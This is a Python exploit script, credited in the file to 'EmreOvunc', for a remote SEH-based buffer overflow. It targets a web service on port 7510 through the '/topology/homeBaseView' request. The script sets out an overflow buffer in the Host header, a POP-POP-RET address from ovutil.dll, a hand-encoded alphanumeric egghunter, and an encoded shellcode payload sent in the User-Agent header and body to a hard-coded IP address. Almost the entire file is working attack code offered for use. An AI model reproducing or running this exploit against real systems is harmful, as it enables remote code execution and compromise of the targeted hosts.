#!/usr/bin/python
#EmreOvunc

from socket import socket
from socket import AF_INET
from socket import SOCK_STREAM

#ovutil.dll -> 0x5A 44 74 5F
#POP EBX - POP - RET
seh = "\x5F\x74\x44\x5A"
#Break point -> shift + f9

#JMP SHORT 1035FEXX
#Converting -> jmp = "\xEB\x04\x90\x90" to new jmp
#x21 -> first ascii character.
jmp = "\x77\x21"

#x90 is in the badchar list.
nops = "\x43" * 2

#Save ESP
#PUSH ESP
#POP EBX
#savESP = "\x54\x5B"

#Restore ESP
#PUSH EBX
#POP ESP
#restorESP = "\x53\x5C"

egghead = "T00WT00W"

#Egghunter..  manually encoded.
egghunter =  "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x54\x58\x2D\x66\x4D\x55\x55\x2D"
egghunter += "\x66\x4B\x55\x55\x2D\x6A\x50\x55\x55"
egghunter += "\x50\x5C\x41\x41\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A\x2D\x21\x55\x55"
egghunter += "\x55\x2D\x21\x54\x55\x55\x2D\x49\x6F"
egghunter += "\x55\x6D\x50\x41\x41\x25\x4A\x4D\x4E"
egghunter += "\x55\x25\x35\x32\x31\x2A\x2D\x71\x21"
egghunter += "\x61\x75\x2D\x71\x21\x61\x75\x2D\x6F"
egghunter += "\x47\x53\x65\x50\x41\x41\x25\x4A\x4D"
egghunter += "\x4E\x55\x25\x35\x32\x31\x2A\x2D\x44"
egghunter += "\x41\x7E\x58\x2D\x44\x34\x7E\x58\x2D"
egghunter += "\x48\x33\x78\x54\x50\x41\x41\x25\x4A"
egghunter += "\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D"
egghunter += "\x71\x7A\x31\x45\x2D\x31\x7A\x31\x45"
egghunter += "\x2D\x6F\x52\x48\x45\x50\x41\x41\x25"
egghunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A"
egghunter += "\x2D\x33\x73\x31\x2D\x2D\x33\x33\x31"
egghunter += "\x2D\x2D\x5E\x54\x43\x31\x50\x41\x41"
egghunter += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x2D\x45\x31\x77\x45\x2D\x45\x31"
egghunter += "\x47\x45\x2D\x74\x45\x74\x46\x50\x41"
egghunter += "\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32"
egghunter += "\x31\x2A\x2D\x52\x32\x32\x32\x2D\x31"
egghunter += "\x31\x31\x31\x2D\x6E\x5A\x4A\x32\x50"
egghunter += "\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35"
egghunter += "\x32\x31\x2A\x2D\x31\x2D\x77\x44\x2D"
egghunter += "\x31\x2D\x77\x44\x2D\x38\x24\x47\x77\x50"

bof = "\x4c" * (3381-len(jmp)) + jmp + seh  + "A" * 32 + egghunter + "A" * 100 

request = "GET /topology/homeBaseView HTTP/1.1\r\n"
request += "Host: " + bof + ":7510\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"

#Run shellcode in unrestricted buffer
buf =  "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
buf += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
buf += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
buf += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
buf += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
buf += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x38"
buf += "\x4e\x56\x46\x52\x46\x52\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x47"
buf += "\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"
buf += "\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x53\x4b\x38"
buf += "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
buf += "\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
buf += "\x46\x4f\x4b\x43\x46\x55\x46\x52\x4a\x52\x45\x57\x45\x4e\x4b\x48"
buf += "\x4f\x35\x46\x42\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x30\x4b\x34"
buf += "\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x43\x30\x4e\x32\x4b\x48"
buf += "\x49\x48\x4e\x46\x46\x42\x4e\x41\x41\x36\x43\x4c\x41\x33\x4b\x4d"
buf += "\x46\x36\x4b\x38\x43\x34\x42\x53\x4b\x58\x42\x44\x4e\x50\x4b\x38"
buf += "\x42\x57\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50\x50\x55\x4a\x46"
buf += "\x50\x38\x50\x54\x50\x30\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x56"
buf += "\x43\x55\x48\x46\x4a\x56\x43\x43\x44\x43\x4a\x56\x47\x47\x43\x37"
buf += "\x44\x43\x4f\x45\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
buf += "\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x35\x49\x58\x45\x4e"
buf += "\x48\x36\x41\x38\x4d\x4e\x4a\x30\x44\x50\x45\x55\x4c\x56\x44\x30"
buf += "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"
buf += "\x4f\x4f\x48\x4d\x43\x35\x43\x35\x43\x55\x43\x35\x43\x55\x43\x44"
buf += "\x43\x35\x43\x44\x43\x35\x4f\x4f\x42\x4d\x48\x36\x4a\x46\x41\x41"
buf += "\x4e\x45\x48\x36\x43\x45\x49\x38\x41\x4e\x45\x49\x4a\x36\x46\x4a"
buf += "\x4c\x41\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x56\x42\x31"
buf += "\x41\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x46\x46\x4a\x4d\x4a\x50\x42"
buf += "\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x45\x4f\x4f\x42\x4d"
buf += "\x4a\x36\x45\x4e\x49\x34\x48\x58\x49\x54\x47\x55\x4f\x4f\x48\x4d"
buf += "\x42\x45\x46\x45\x46\x55\x45\x55\x4f\x4f\x42\x4d\x43\x59\x4a\x56"
buf += "\x47\x4e\x49\x37\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x55"
buf += "\x4f\x4f\x42\x4d\x48\x56\x4c\x46\x46\x36\x48\x46\x4a\x56\x43\x56"
buf += "\x4d\x56\x49\x38\x45\x4e\x4c\x46\x42\x45\x49\x55\x49\x52\x4e\x4c"
buf += "\x49\x38\x47\x4e\x4c\x56\x46\x34\x49\x48\x44\x4e\x41\x43\x42\x4c"
buf += "\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x42\x50\x4f\x44\x34\x4e\x52"
buf += "\x43\x49\x4d\x58\x4c\x47\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
buf += "\x44\x37\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
buf += "\x48\x4d\x4b\x35\x47\x35\x44\x45\x41\x45\x41\x45\x41\x55\x4c\x36"
buf += "\x41\x50\x41\x45\x41\x55\x45\x35\x41\x45\x4f\x4f\x42\x4d\x4a\x46"
buf += "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
buf += "\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
buf += "\x43\x48\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
buf += "\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x45\x43\x45\x4f\x4f\x48\x4d"
buf += "\x4f\x4f\x42\x4d\x5a"
shell = egghead + buf + "C" * 500
request += "User-Agent: "+ shell +"\r\n"
request += "Content-Length: 1048580\r\n\r\n"
request += shell

expl = socket ( AF_INET, SOCK_STREAM )
expl.connect(("10.10.0.1", 7510))
expl.send(request)
expl.close()
